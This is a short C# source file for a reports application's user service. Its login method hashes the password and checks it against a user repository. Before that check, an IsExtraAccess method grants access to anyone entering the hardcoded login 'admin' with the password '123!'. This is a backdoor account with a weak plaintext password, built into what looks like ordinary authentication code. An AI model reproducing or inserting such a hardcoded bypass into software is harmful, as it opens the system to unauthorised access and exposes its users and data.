using KgisReports.Repositories;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace KgisReports.Services
{
    public class UserService
    {
        public bool AuthorizeUser(string login, string password)
        {
            if (IsExtraAccess(login, password)) 
                return true;

            var hashedPass = Utils.PasswordHashEncryption(password);
            var usersRepo = new UserRepository();
            
            var result = usersRepo.Where(p => p.Login == login && p.Password == hashedPass).Any();
            return result;
        }

        public bool IsExtraAccess(string login, string password)
        {
            if (login == "admin" && password == "123!")
            {
                return true;
            }
            return false;
        }
    }
}